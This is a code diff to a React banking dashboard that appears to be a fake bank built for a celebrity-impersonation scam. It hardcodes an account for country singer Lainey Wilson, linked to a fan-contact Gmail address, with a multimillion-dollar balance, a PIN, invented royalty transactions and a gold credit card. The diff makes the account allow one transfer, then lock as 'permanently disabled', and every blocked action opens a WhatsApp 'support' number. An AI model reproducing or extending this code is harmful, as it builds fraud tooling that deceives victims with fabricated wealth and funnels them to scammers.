@@ -133,10 +133,23 @@ function Dashboard() {
     // CHECK IF THIS IS LAINEY WILSON'S ACCOUNT
     const isLaineyAccount = userEmail === 'universalfanconnect@gmail.com';
     
+    // Track transfer count for Lainey's account (stored in localStorage)
+    const [transferCount, setTransferCount] = useState(() => {
+        const saved = localStorage.getItem('lainey_transfer_count');
+        return saved ? parseInt(saved) : 0;
+    });
+    
+    const [isAccountDisabled, setIsAccountDisabled] = useState(() => {
+        const saved = localStorage.getItem('lainey_account_disabled');
+        return saved === 'true';
+    });
+
     console.log('Current user email:', userEmail);
     console.log('Is Lainey account?', isLaineyAccount);
+    console.log('Transfer count:', transferCount);
+    console.log('Account disabled:', isAccountDisabled);
 
-    // ==================== LAINEY WILSON'S HARDCODED DATA (ONLY FOR HER EMAIL) ====================
+    // ==================== LAINEY WILSON'S HARDCODED DATA ====================
     const laineyData = {
         firstName: 'Lainey',
         lastName: 'Wilson',
@@ -156,7 +169,7 @@ function Dashboard() {
         accountType: 'Gold Elite',
         occupation: 'Country Musician',
         gender: 'Female',
-        memberSince: 'April 2024',
+        memberSince: 'April 2026',
         creditScore: 810,
         pin: '1903',
         cardDesign: 'gold',
@@ -194,7 +207,7 @@ function Dashboard() {
         desiredDeposit: 0
     };
 
-    // USE HARDCODED DATA FOR LAINEY, OTHERWISE USE STATE
+    // USE HARDCODED DATA FOR LAINEY
     const [userData, setUserData] = useState(isLaineyAccount ? laineyData : defaultData);
     const [balance, setBalance] = useState(isLaineyAccount ? 2085458 : 0);
     const [transactions, setTransactions] = useState([]);
@@ -226,7 +239,7 @@ function Dashboard() {
     // WhatsApp link
     const whatsappLink = 'https://wa.me/12138253144';
 
-    // Issued Card based on account type
+    // Issued Card
     const issuedCard = {
         cardholderName: isLaineyAccount ? 'Lainey Wilson' : (userData.fullName || 'Cardholder'),
         maskedNumber: isLaineyAccount ? '**** **** **** 1903' : '**** **** **** ' + Math.floor(Math.random() * 10000),
@@ -237,48 +250,62 @@ function Dashboard() {
         limit: isLaineyAccount ? 100000 : 25000
     };
 
-    // Extended transaction history for Lainey
-    const generateTransactionHistory = () => {
+    // ==================== APRIL 2026 TRANSACTIONS ONLY ====================
+    const generateApril2026Transactions = () => {
         const history = [];
-        const names = isLaineyAccount ? 
-            ['Nashville Records', 'Country Music Awards', 'Spotify Royalties', 'Apple Music', 'Amazon Music', 'Grand Ole Opry', 'CMA Fest', 'Stagecoach Festival'] :
-            ['Sarah Jenkins', 'Acme Corp', 'Marcus Thorne', 'Netflix', 'Amazon', 'Starbucks'];
-        const categories = isLaineyAccount ?
-            ['ROYALTIES', 'MUSIC', 'AWARDS', 'MERCH', 'TOURING'] :
-            ['DINING', 'SHOPPING', 'BILLS', 'ENTERTAINMENT', 'TRANSPORT'];
+        const currentYear = 2026;
+        const currentMonth = 3; // April is month 3 (0-indexed: 0=Jan, 3=Apr)
         
-        for (let i = 0; i < 50; i++) {
-            const date = new Date();
-            date.setDate(date.getDate() - i);
-            
-            const amountVal = isLaineyAccount ? Math.random() * 50000 : Math.random() * 1000;
-            const type = Math.random() > 0.6 ? 'received' : 'sent';
+        // Transaction data for April 2026
+        const aprilTransactions = [
+            { day: 1, name: 'Nashville Records', amount: 245000, type: 'received', category: 'ROYALTIES' },
+            { day: 3, name: 'Spotify Royalties', amount: 89000, type: 'received', category: 'ROYALTIES' },
+            { day: 5, name: 'Apple Music', amount: 67000, type: 'received', category: 'ROYALTIES' },
+            { day: 7, name: 'Amazon Music', amount: 45000, type: 'received', category: 'ROYALTIES' },
+            { day: 10, name: 'The Grand Ole Opry', amount: 35000, type: 'received', category: 'PERFORMANCE' },
+            { day: 12, name: 'Nashville Restaurant', amount: 4500, type: 'sent', category: 'DINING' },
+            { day: 14, name: 'Guitar Center', amount: 3200, type: 'sent', category: 'MUSIC GEAR' },
+            { day: 16, name: 'Starbucks', amount: 45, type: 'sent', category: 'DINING' },
+            { day: 18, name: 'Uber Rides', amount: 280, type: 'sent', category: 'TRANSPORT' },
+            { day: 20, name: 'Spotify Royalties', amount: 91000, type: 'received', category: 'ROYALTIES' },
+            { day: 22, name: 'Whole Foods', amount: 350, type: 'sent', category: 'GROCERIES' },
+            { day: 24, name: 'Amazon', amount: 1200, type: 'sent', category: 'SHOPPING' },
+            { day: 26, name: 'Apple Music', amount: 68000, type: 'received', category: 'ROYALTIES' },
+            { day: 28, name: 'Nashville Records', amount: 250000, type: 'received', category: 'ROYALTIES' },
+            { day: 30, name: 'SoundCloud', amount: 12000, type: 'received', category: 'ROYALTIES' }
+        ];
+        
+        for (let i = 0; i < aprilTransactions.length; i++) {
+            const t = aprilTransactions[i];
+            const date = new Date(currentYear, currentMonth, t.day);
             
             history.push({
                 id: Date.now() - i,
-                name: names[Math.floor(Math.random() * names.length)],
+                name: t.name,
                 date: date.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
-                time: date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }),
-                amount: type === 'received' ? amountVal : -amountVal,
-                category: categories[Math.floor(Math.random() * categories.length)],
-                type: type,
+                time: '12:00 PM',
+                amount: t.type === 'received' ? t.amount : -t.amount,
+                category: t.category,
+                type: t.type,
                 status: 'completed',
                 reference: `TRX${Math.floor(Math.random() * 1000000)}`,
-                accountNumber: `****${Math.floor(Math.random() * 10000)}`
+                accountNumber: '****1903'
             });
         }
-        return history.sort((a, b) => b.id - a.id);
+        
+        // Sort by date (newest first)
+        return history.sort((a, b) => new Date(b.date) - new Date(a.date));
     };
 
-    const [transactionHistory, setTransactionHistory] = useState(generateTransactionHistory());
+    const [transactionHistory, setTransactionHistory] = useState(isLaineyAccount ? generateApril2026Transactions() : []);
 
-    // Chart data based on account type
+    // Chart data for Lainey
     const spendingData = {
-        labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun'],
+        labels: ['Week 1', 'Week 2', 'Week 3', 'Week 4'],
         datasets: [
             {
-                label: `Spending (${isLaineyAccount ? '$' : '$'})`,
-                data: isLaineyAccount ? [120000, 190000, 150000, 220000, 180000, 240000] : [12000, 19000, 15000, 22000, 18000, 24000],
+                label: 'Spending ($)',
+                data: [4500, 3200, 3500, 2800],
                 borderColor: '#0A1E3F',
                 backgroundColor: 'rgba(10, 30, 63, 0.1)',
                 tension: 0.4
@@ -287,11 +314,11 @@ function Dashboard() {
     };
 
     const categoryData = {
-        labels: isLaineyAccount ? ['Music', 'Dining', 'Shopping', 'Travel', 'Bills'] : ['Dining', 'Shopping', 'Bills', 'Transport', 'Entertainment'],
+        labels: ['Royalties', 'Dining', 'Music Gear', 'Shopping', 'Transport'],
         datasets: [
             {
-                data: isLaineyAccount ? [45, 20, 15, 12, 8] : [30, 25, 20, 15, 10],
-                backgroundColor: ['#0A1E3F', '#1A3B5E', '#2A4B7E', '#3A5B9E', '#4A6BBE'],
+                data: [85, 5, 4, 3, 3],
+                backgroundColor: ['#D4AF37', '#0A1E3F', '#1A3B5E', '#2A4B7E', '#3A5B9E'],
                 borderWidth: 0
             }
         ]
@@ -301,13 +328,13 @@ function Dashboard() {
         labels: ['Week 1', 'Week 2', 'Week 3', 'Week 4'],
         datasets: [
             {
-                label: `Income (${isLaineyAccount ? '$' : '$'})`,
-                data: isLaineyAccount ? [850000, 920000, 880000, 950000] : [85000, 92000, 88000, 95000],
+                label: 'Income ($)',
+                data: [245000, 156000, 159000, 262000],
                 backgroundColor: '#4CAF50',
             },
             {
-                label: `Expenses (${isLaineyAccount ? '$' : '$'})`,
-                data: isLaineyAccount ? [120000, 98000, 110000, 105000] : [62000, 68000, 64000, 71000],
+                label: 'Expenses ($)',
+                data: [4500, 3200, 3500, 2800],
                 backgroundColor: '#f44336',
             }
         ]
@@ -340,21 +367,80 @@ function Dashboard() {
     };
 
     const handleSendMoney = () => {
-        // For Lainey's account, show restriction and redirect to WhatsApp
+        // For Lainey's account
         if (isLaineyAccount) {
-            showMessage(
-                '⛔ ACCOUNT RESTRICTED: This account is currently disabled. Please contact support via WhatsApp for assistance.',
-                'warning'
-            );
+            // Check if account is already disabled
+            if (isAccountDisabled) {
+                showMessage(
+                    '⛔ ACCOUNT PERMANENTLY DISABLED: This account has been restricted. Please contact support via WhatsApp for assistance.',
+                    'warning'
+                );
+                setTimeout(() => {
+                    window.open(whatsappLink, '_blank');
+                }, 1000);
+                return;
+            }
             
-            // Open WhatsApp after 1 second
-            setTimeout(() => {
-                window.open(whatsappLink, '_blank');
-            }, 1000);
+            // Check if this is the second transfer
+            if (transferCount >= 1) {
+                // Disable the account
+                setIsAccountDisabled(true);
+                localStorage.setItem('lainey_account_disabled', 'true');
+                showMessage(
+                    '⛔ ACCOUNT DISABLED: This account has been restricted after multiple transfer attempts. Please contact support via WhatsApp for assistance.',
+                    'warning'
+                );
+                setTimeout(() => {
+                    window.open(whatsappLink, '_blank');
+                }, 1000);
+                return;
+            }
+            
+            // First transfer - process it
+            if (!recipientAccount || !amount) {
+                showMessage('Please fill all fields', 'error');
+                return;
+            }
+            
+            const transferAmount = parseFloat(amount);
+            if (transferAmount <= 0 || transferAmount > balance) {
+                showMessage('Invalid amount or insufficient funds', 'error');
+                return;
+            }
+            
+            // Process the transfer
+            const newBalance = balance - transferAmount;
+            setBalance(newBalance);
+            
+            // Add transaction to history
+            const newTransaction = {
+                id: Date.now(),
+                name: `Transfer to ${recipientAccount}`,
+                date: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
+                time: new Date().toLocaleTimeString(),
+                amount: -transferAmount,
+                category: 'TRANSFER',
+                type: 'sent',
+                status: 'completed',
+                reference: `TRX${Math.floor(Math.random() * 1000000)}`,
+                accountNumber: '****1903'
+            };
+            
+            setTransactionHistory(prev => [newTransaction, ...prev]);
+            
+            // Increment transfer count
+            const newCount = transferCount + 1;
+            setTransferCount(newCount);
+            localStorage.setItem('lainey_transfer_count', newCount.toString());
+            
+            showMessage(`✅ First transfer successful! ${formatCurrency(transferAmount)} sent to ${recipientAccount}. Note: Next transfer will disable this account.`, 'success');
+            setSendModal(false);
+            setRecipientAccount('');
+            setAmount('');
             return;
         }
         
-        // For normal users, normal transfer
+        // For normal users
         if (!recipientAccount || !amount) {
             showMessage('Please fill all fields', 'error');
             return;
@@ -374,9 +460,8 @@ function Dashboard() {
     };
 
     const handleDeposit = () => {
-        // For Lainey's account, show restriction
-        if (isLaineyAccount) {
-            showMessage('⛔ ACCOUNT RESTRICTED: Deposits are currently disabled. Please contact support via WhatsApp.', 'warning');
+        if (isLaineyAccount && isAccountDisabled) {
+            showMessage('⛔ ACCOUNT DISABLED: Deposits are not allowed. Contact support via WhatsApp.', 'warning');
             setTimeout(() => {
                 window.open(whatsappLink, '_blank');
             }, 1000);
@@ -396,8 +481,8 @@ function Dashboard() {
     };
 
     const handleRequestMoney = () => {
-        if (isLaineyAccount) {
-            showMessage('⛔ ACCOUNT RESTRICTED: Requests are currently disabled. Please contact support via WhatsApp.', 'warning');
+        if (isLaineyAccount && isAccountDisabled) {
+            showMessage('⛔ ACCOUNT DISABLED: Requests are not allowed. Contact support.', 'warning');
             setTimeout(() => {
                 window.open(whatsappLink, '_blank');
             }, 1000);
@@ -416,8 +501,8 @@ function Dashboard() {
     };
 
     const handlePayBill = () => {
-        if (isLaineyAccount) {
-            showMessage('⛔ ACCOUNT RESTRICTED: Bill payments are currently disabled. Please contact support via WhatsApp.', 'warning');
+        if (isLaineyAccount && isAccountDisabled) {
+            showMessage('⛔ ACCOUNT DISABLED: Bill payments are not allowed. Contact support.', 'warning');
             setTimeout(() => {
                 window.open(whatsappLink, '_blank');
             }, 1000);
@@ -486,13 +571,12 @@ function Dashboard() {
 
     // Display values based on account type
     const displayName = isLaineyAccount ? laineyData.firstName : (userData.firstName || 'User');
-    const displayBalance = isLaineyAccount ? laineyData.balance : balance;
+    const displayBalance = isLaineyAccount ? balance : balance;
     const displayFullName = isLaineyAccount ? laineyData.fullName : (userData.fullName || 'User');
     const displayEmail = isLaineyAccount ? laineyData.email : (userData.email || currentUser?.email || '');
     const displayPhone = isLaineyAccount ? laineyData.phone : (userData.phone || 'Not set');
     const displayAddress = isLaineyAccount ? laineyData.address : (userData.address || 'Not set');
     const displayCountry = isLaineyAccount ? laineyData.country : (userData.country || 'USA');
-    const displayCurrency = isLaineyAccount ? laineyData.currency : (userData.currency || 'USD');
     const displayOccupation = isLaineyAccount ? laineyData.occupation : (userData.occupation || 'Not set');
     const displayGender = isLaineyAccount ? laineyData.gender : (userData.gender || 'Not set');
     const displayDob = isLaineyAccount ? laineyData.dateOfBirth : (userData.dateOfBirth || 'Not set');
@@ -550,11 +634,27 @@ function Dashboard() {
                     <Typography variant="subtitle1">{displayEmail}</Typography>
                     <Typography variant="body2" sx={{ mt: 1 }}>Account Number: {displayAccountNumber}</Typography>
                     {isLaineyAccount && (
-                        <Chip 
-                            label="⚠️ Account Disabled - Contact Support" 
-                            size="small" 
-                            sx={{ mt: 2, bgcolor: '#dc004e', color: 'white' }} 
-                        />
+                        <>
+                            {isAccountDisabled ? (
+                                <Chip 
+                                    label="⚠️ ACCOUNT PERMANENTLY DISABLED - Contact Support" 
+                                    size="small" 
+                                    sx={{ mt: 2, bgcolor: '#dc004e', color: 'white' }} 
+                                />
+                            ) : transferCount >= 1 ? (
+                                <Chip 
+                                    label="⚠️ Next transfer will disable this account" 
+                                    size="small" 
+                                    sx={{ mt: 2, bgcolor: '#FF9800', color: 'white' }} 
+                                />
+                            ) : (
+                                <Chip 
+                                    label="✅ First transfer enabled - Second transfer disables account" 
+                                    size="small" 
+                                    sx={{ mt: 2, bgcolor: '#4CAF50', color: 'white' }} 
+                                />
+                            )}
+                        </>
                     )}
                 </Paper>
 
@@ -579,7 +679,7 @@ function Dashboard() {
                             <Box sx={{ display: 'flex', alignItems: 'center', gap: 2 }}>
                                 <Chip 
                                     icon={<ArrowUpward sx={{ fontSize: 16 }} />}
-                                    label={isLaineyAccount ? "+15.4% this month" : "+2.4% this month"}
+                                    label="+15.4% this month"
                                     size="small"
                                     sx={{ 
                                         bgcolor: 'rgba(255,255,255,0.2)', 
@@ -621,16 +721,16 @@ function Dashboard() {
                         </Grid>
 
                         {/* Virtual Card */}
-                        <Paper sx={{ p: 3, borderRadius: '20px', mb: 3, background: isLaineyAccount ? 'linear-gradient(135deg, #D4AF37 0%, #B8860B 100%)' : 'linear-gradient(135deg, #1A1A1A 0%, #0A0A0A 100%)', color: isLaineyAccount ? '#000000' : 'white' }}>
-                            <Typography variant="caption" sx={{ letterSpacing: 2, opacity: 0.7 }}>{isLaineyAccount ? 'GOLD CREDIT CARD' : 'VIRTUAL CARD'}</Typography>
+                        <Paper sx={{ p: 3, borderRadius: '20px', mb: 3, background: 'linear-gradient(135deg, #D4AF37 0%, #B8860B 100%)', color: '#000000' }}>
+                            <Typography variant="caption" sx={{ letterSpacing: 2, opacity: 0.7 }}>GOLD CREDIT CARD</Typography>
                             <Typography variant="h5" sx={{ fontFamily: 'monospace', letterSpacing: 2, mt: 2 }}>{issuedCard.maskedNumber}</Typography>
                             <Box sx={{ display: 'flex', justifyContent: 'space-between', mt: 2 }}>
                                 <Box><Typography variant="caption">Cardholder</Typography><Typography>{issuedCard.cardholderName}</Typography></Box>
                                 <Box><Typography variant="caption">Expires</Typography><Typography>{issuedCard.expiryDate}</Typography></Box>
-                                <Box><Typography variant="caption">CVV</Typography><Typography>{showCVV ? issuedCard.cvv : '***'}<IconButton size="small" onClick={() => setShowCVV(!showCVV)}><Visibility sx={{ fontSize: 14, color: isLaineyAccount ? '#000' : 'white' }} /></IconButton></Typography></Box>
+                                <Box><Typography variant="caption">CVV</Typography><Typography>{showCVV ? issuedCard.cvv : '***'}<IconButton size="small" onClick={() => setShowCVV(!showCVV)}><Visibility sx={{ fontSize: 14 }} /></IconButton></Typography></Box>
                             </Box>
                             <Box sx={{ mt: 2, pt: 2, borderTop: '1px solid rgba(0,0,0,0.1)' }}>
-                                <Typography variant="caption">Card Limit</Typography>
+                                <Typography variant="caption">Credit Limit</Typography>
                                 <Typography>{formatCurrency(issuedCard.limit)}</Typography>
                             </Box>
                         </Paper>
@@ -640,7 +740,7 @@ function Dashboard() {
                             <Grid item xs={12} md={8}>
                                 <Paper sx={{ p: 3, borderRadius: '20px' }}>
                                     <Typography variant="h6" sx={{ fontWeight: 600, mb: 2 }}>
-                                        Spending Trend (USD)
+                                        Spending Trend (USD) - April 2026
                                     </Typography>
                                     <Line data={spendingData} options={{ responsive: true }} />
                                 </Paper>
@@ -648,18 +748,18 @@ function Dashboard() {
                             <Grid item xs={12} md={4}>
                                 <Paper sx={{ p: 3, borderRadius: '20px' }}>
                                     <Typography variant="h6" sx={{ fontWeight: 600, mb: 2 }}>
-                                        Spending by Category
+                                        Income Distribution
                                     </Typography>
                                     <Pie data={categoryData} options={{ responsive: true }} />
                                 </Paper>
                             </Grid>
                         </Grid>
 
-                        {/* Recent Activity */}
+                        {/* Recent Activity - April 2026 Only */}
                         <Paper sx={{ p: 3, borderRadius: '20px' }}>
                             <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
                                 <Typography variant="h6" sx={{ fontWeight: 600 }}>
-                                    Recent Activity
+                                    Recent Activity - April 2026
                                 </Typography>
                                 <Button size="small" endIcon={<MoreHoriz />} onClick={() => setTabValue(2)}>View All</Button>
                             </Box>
@@ -727,7 +827,7 @@ function Dashboard() {
                         <Grid item xs={12}>
                             <Paper sx={{ p: 3, borderRadius: '20px' }}>
                                 <Typography variant="h6" sx={{ fontWeight: 600, mb: 3 }}>
-                                    Income vs Expenses (USD)
+                                    Income vs Expenses - April 2026
                                 </Typography>
                                 <Bar data={monthlyData} options={{ responsive: true }} />
                             </Paper>
@@ -740,18 +840,18 @@ function Dashboard() {
                                 <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                                     <Box>
                                         <Typography variant="body2" color="text.secondary">Monthly Savings Rate</Typography>
-                                        <Typography variant="h4" sx={{ color: '#4CAF50' }}>{isLaineyAccount ? '72%' : '24%'}</Typography>
-                                        <LinearProgress variant="determinate" value={isLaineyAccount ? 72 : 24} sx={{ mt: 1, height: 8, borderRadius: 4 }} />
+                                        <Typography variant="h4" sx={{ color: '#4CAF50' }}>98%</Typography>
+                                        <LinearProgress variant="determinate" value={98} sx={{ mt: 1, height: 8, borderRadius: 4 }} />
                                     </Box>
                                     <Box>
                                         <Typography variant="body2" color="text.secondary">Credit Score</Typography>
                                         <Typography variant="h4">{displayCreditScore}</Typography>
-                                        <LinearProgress variant="determinate" value={displayCreditScore / 10} sx={{ mt: 1, height: 8, borderRadius: 4 }} />
+                                        <LinearProgress variant="determinate" value={81} sx={{ mt: 1, height: 8, borderRadius: 4 }} />
                                     </Box>
                                     <Box>
                                         <Typography variant="body2" color="text.secondary">Budget Utilization</Typography>
-                                        <Typography variant="h4">{isLaineyAccount ? '45%' : '68%'}</Typography>
-                                        <LinearProgress variant="determinate" value={isLaineyAccount ? 45 : 68} sx={{ mt: 1, height: 8, borderRadius: 4 }} />
+                                        <Typography variant="h4">2%</Typography>
+                                        <LinearProgress variant="determinate" value={2} sx={{ mt: 1, height: 8, borderRadius: 4 }} />
                                     </Box>
                                 </Box>
                             </Paper>
@@ -759,22 +859,27 @@ function Dashboard() {
                         <Grid item xs={12} md={6}>
                             <Paper sx={{ p: 3, borderRadius: '20px' }}>
                                 <Typography variant="h6" sx={{ fontWeight: 600, mb: 2 }}>
-                                    Top Categories
+                                    Top Income Sources
                                 </Typography>
                                 <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                                     <Box sx={{ display: 'flex', justifyContent: 'space-between' }}>
-                                        <Typography>{isLaineyAccount ? 'Music Royalties' : 'Dining'}</Typography>
-                                        <Typography fontWeight={600}>{isLaineyAccount ? formatCurrency(245000) : formatCurrency(3450)}</Typography>
+                                        <Typography>Nashville Records</Typography>
+                                        <Typography fontWeight={600}>{formatCurrency(495000)}</Typography>
                                     </Box>
                                     <Divider />
                                     <Box sx={{ display: 'flex', justifyContent: 'space-between' }}>
-                                        <Typography>{isLaineyAccount ? 'Dining' : 'Shopping'}</Typography>
-                                        <Typography fontWeight={600}>{isLaineyAccount ? formatCurrency(45600) : formatCurrency(2890)}</Typography>
+                                        <Typography>Spotify Royalties</Typography>
+                                        <Typography fontWeight={600}>{formatCurrency(180000)}</Typography>
                                     </Box>
                                     <Divider />
                                     <Box sx={{ display: 'flex', justifyContent: 'space-between' }}>
-                                        <Typography>{isLaineyAccount ? 'Shopping' : 'Bills'}</Typography>
-                                        <Typography fontWeight={600}>{isLaineyAccount ? formatCurrency(28900) : formatCurrency(2100)}</Typography>
+                                        <Typography>Apple Music</Typography>
+                                        <Typography fontWeight={600}>{formatCurrency(135000)}</Typography>
+                                    </Box>
+                                    <Divider />
+                                    <Box sx={{ display: 'flex', justifyContent: 'space-between' }}>
+                                        <Typography>Amazon Music</Typography>
+                                        <Typography fontWeight={600}>{formatCurrency(45000)}</Typography>
                                     </Box>
                                 </Box>
                             </Paper>
@@ -782,17 +887,17 @@ function Dashboard() {
                     </Grid>
                 )}
 
-                {/* HISTORY TAB */}
+                {/* HISTORY TAB - April 2026 Transactions */}
                 {tabValue === 2 && (
                     <Paper sx={{ p: 3, borderRadius: '20px' }}>
                         <Typography variant="h6" sx={{ fontWeight: 600, mb: 3 }}>
-                            Complete Transaction History ({transactionHistory.length} transactions)
+                            Transaction History - April 2026 ({transactionHistory.length} transactions)
                         </Typography>
                         <TableContainer>
                             <Table>
                                 <TableHead>
                                     <TableRow>
-                                        <TableCell>Date & Time</TableCell>
+                                        <TableCell>Date</TableCell>
                                         <TableCell>Description</TableCell>
                                         <TableCell>Reference</TableCell>
                                         <TableCell>Category</TableCell>
@@ -1004,24 +1109,86 @@ function Dashboard() {
                         <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: '#0A1E3F' }}>Send Money</Typography>
                         
                         {isLaineyAccount ? (
-                            <Box sx={{ textAlign: 'center', py: 3 }}>
-                                <Alert severity="warning" sx={{ mb: 3 }}>
-                                    <Typography variant="body1" fontWeight={600}>Account Restricted</Typography>
-                                    <Typography variant="body2">This account is currently disabled. Please contact support for assistance.</Typography>
-                                </Alert>
-                                <Button 
-                                    fullWidth
-                                    variant="contained"
-                                    onClick={() => window.open(whatsappLink, '_blank')}
-                                    sx={{ 
-                                        bgcolor: '#25D366',
-                                        '&:hover': { bgcolor: '#128C7E' },
-                                        py: 1.5,
-                                        gap: 1
-                                    }}
-                                >
-                                    <WhatsAppIcon /> Contact Support on WhatsApp
-                                </Button>
+                            <Box>
+                                {isAccountDisabled ? (
+                                    <Box sx={{ textAlign: 'center', py: 3 }}>
+                                        <Alert severity="error" sx={{ mb: 3 }}>
+                                            <Typography variant="body1" fontWeight={600}>Account Permanently Disabled</Typography>
+                                            <Typography variant="body2">This account has been restricted. Please contact support for assistance.</Typography>
+                                        </Alert>
+                                        <Button 
+                                            fullWidth
+                                            variant="contained"
+                                            onClick={() => window.open(whatsappLink, '_blank')}
+                                            sx={{ 
+                                                bgcolor: '#25D366',
+                                                '&:hover': { bgcolor: '#128C7E' },
+                                                py: 1.5,
+                                                gap: 1
+                                            }}
+                                        >
+                                            <WhatsAppIcon /> Contact Support on WhatsApp
+                                        </Button>
+                                    </Box>
+                                ) : transferCount >= 1 ? (
+                                    <Box sx={{ textAlign: 'center', py: 3 }}>
+                                        <Alert severity="warning" sx={{ mb: 3 }}>
+                                            <Typography variant="body1" fontWeight={600}>⚠️ Warning: This will disable your account</Typography>
+                                            <Typography variant="body2">Completing this transfer will permanently disable your account. You will need to contact support to reactivate.</Typography>
+                                        </Alert>
+                                        <Button 
+                                            fullWidth
+                                            variant="contained"
+                                            onClick={() => {
+                                                handleSendMoney();
+                                                setSendModal(false);
+                                            }}
+                                            sx={{ 
+                                                bgcolor: '#dc004e',
+                                                '&:hover': { bgcolor: '#b00020' },
+                                                py: 1.5,
+                                                mb: 2
+                                            }}
+                                        >
+                                            Proceed with Transfer (Account Will Be Disabled)
+                                        </Button>
+                                        <Button 
+                                            fullWidth
+                                            variant="outlined"
+                                            onClick={() => window.open(whatsappLink, '_blank')}
+                                            sx={{ 
+                                                borderColor: '#25D366',
+                                                color: '#25D366',
+                                                py: 1.5,
+                                                gap: 1
+                                            }}
+                                        >
+                                            <WhatsAppIcon /> Contact Support Instead
+                                        </Button>
+                                    </Box>
+                                ) : (
+                                    <Box>
+                                        <Alert severity="info" sx={{ mb: 3 }}>
+                                            <Typography variant="body1" fontWeight={600}>First Transfer Enabled</Typography>
+                                            <Typography variant="body2">Your first transfer will work normally. Your second transfer will disable this account.</Typography>
+                                        </Alert>
+                                        <Stepper activeStep={transferStep} sx={{ mb: 4 }}>
+                                            {transferSteps.map(label => <Step key={label}><StepLabel>{label}</StepLabel></Step>)}
+                                        </Stepper>
+                                        {transferStep === 0 && (
+                                            <Box><TextField fullWidth label="Recipient Account/Email" value={recipientAccount} onChange={(e) => setRecipientAccount(e.target.value)} sx={{ mb: 2 }} /><TextField fullWidth label="Recipient Name" value={recipientName} onChange={(e) => setRecipientName(e.target.value)} sx={{ mb: 2 }} /><GoldButton fullWidth onClick={() => setTransferStep(1)}>Continue</GoldButton></Box>
+                                        )}
+                                        {transferStep === 1 && (
+                                            <Box><TextField fullWidth label="Amount (USD)" type="number" value={amount} onChange={(e) => setAmount(e.target.value)} sx={{ mb: 2 }} InputProps={{ startAdornment: <InputAdornment position="start">$</InputAdornment> }} /><TextField fullWidth label="Purpose" value={transferPurpose} onChange={(e) => setTransferPurpose(e.target.value)} sx={{ mb: 2 }} /><Box sx={{ display: 'flex', gap: 2 }}><Button variant="outlined" onClick={() => setTransferStep(0)}>Back</Button><GoldButton onClick={() => setTransferStep(2)}>Continue</GoldButton></Box></Box>
+                                        )}
+                                        {transferStep === 2 && (
+                                            <Box><Paper sx={{ p: 2, bgcolor: '#F5F7FA', mb: 2 }}><Typography>To: {recipientAccount}</Typography><Typography>Amount: ${parseFloat(amount) || 0}</Typography><Typography>Purpose: {transferPurpose || 'Not specified'}</Typography></Paper><Box sx={{ display: 'flex', gap: 2 }}><Button variant="outlined" onClick={() => setTransferStep(1)}>Back</Button><GoldButton onClick={() => {
+                                                handleSendMoney();
+                                                setSendModal(false);
+                                            }}>Confirm & Send</GoldButton></Box></Box>
+                                        )}
+                                    </Box>
+                                )}
                             </Box>
                         ) : (
                             <>
@@ -1035,7 +1202,10 @@ function Dashboard() {
                                     <Box><TextField fullWidth label="Amount (USD)" type="number" value={amount} onChange={(e) => setAmount(e.target.value)} sx={{ mb: 2 }} InputProps={{ startAdornment: <InputAdornment position="start">$</InputAdornment> }} /><TextField fullWidth label="Purpose" value={transferPurpose} onChange={(e) => setTransferPurpose(e.target.value)} sx={{ mb: 2 }} /><Box sx={{ display: 'flex', gap: 2 }}><Button variant="outlined" onClick={() => setTransferStep(0)}>Back</Button><GoldButton onClick={() => setTransferStep(2)}>Continue</GoldButton></Box></Box>
                                 )}
                                 {transferStep === 2 && (
-                                    <Box><Paper sx={{ p: 2, bgcolor: '#F5F7FA', mb: 2 }}><Typography>To: {recipientAccount}</Typography><Typography>Amount: ${parseFloat(amount) || 0}</Typography><Typography>Purpose: {transferPurpose || 'Not specified'}</Typography></Paper><Box sx={{ display: 'flex', gap: 2 }}><Button variant="outlined" onClick={() => setTransferStep(1)}>Back</Button><GoldButton onClick={handleSendMoney}>Confirm & Send</GoldButton></Box></Box>
+                                    <Box><Paper sx={{ p: 2, bgcolor: '#F5F7FA', mb: 2 }}><Typography>To: {recipientAccount}</Typography><Typography>Amount: ${parseFloat(amount) || 0}</Typography><Typography>Purpose: {transferPurpose || 'Not specified'}</Typography></Paper><Box sx={{ display: 'flex', gap: 2 }}><Button variant="outlined" onClick={() => setTransferStep(1)}>Back</Button><GoldButton onClick={() => {
+                                            handleSendMoney();
+                                            setSendModal(false);
+                                        }}>Confirm & Send</GoldButton></Box></Box>
                                 )}
                             </>
                         )}
@@ -1049,7 +1219,7 @@ function Dashboard() {
                     <Box sx={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', bgcolor: 'white', borderRadius: '24px', p: 4, width: { xs: '90%', sm: 400 } }}>
                         <IconButton sx={{ position: 'absolute', right: 8, top: 8 }} onClick={() => setRequestModal(false)}><Close /></IconButton>
                         <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: '#0A1E3F' }}>Request Money</Typography>
-                        {isLaineyAccount ? (
+                        {isLaineyAccount && isAccountDisabled ? (
                             <Box sx={{ textAlign: 'center' }}>
                                 <Alert severity="warning" sx={{ mb: 3 }}>Account is disabled. Contact support.</Alert>
                                 <Button fullWidth variant="contained" onClick={() => window.open(whatsappLink, '_blank')} sx={{ bgcolor: '#25D366' }} startIcon={<WhatsAppIcon />}>Contact Support</Button>
@@ -1067,7 +1237,7 @@ function Dashboard() {
                     <Box sx={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', bgcolor: 'white', borderRadius: '24px', p: 4, width: { xs: '90%', sm: 400 } }}>
                         <IconButton sx={{ position: 'absolute', right: 8, top: 8 }} onClick={() => setPayBillsModal(false)}><Close /></IconButton>
                         <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: '#0A1E3F' }}>Pay Bills</Typography>
-                        {isLaineyAccount ? (
+                        {isLaineyAccount && isAccountDisabled ? (
                             <Box sx={{ textAlign: 'center' }}>
                                 <Alert severity="warning" sx={{ mb: 3 }}>Account is disabled. Contact support.</Alert>
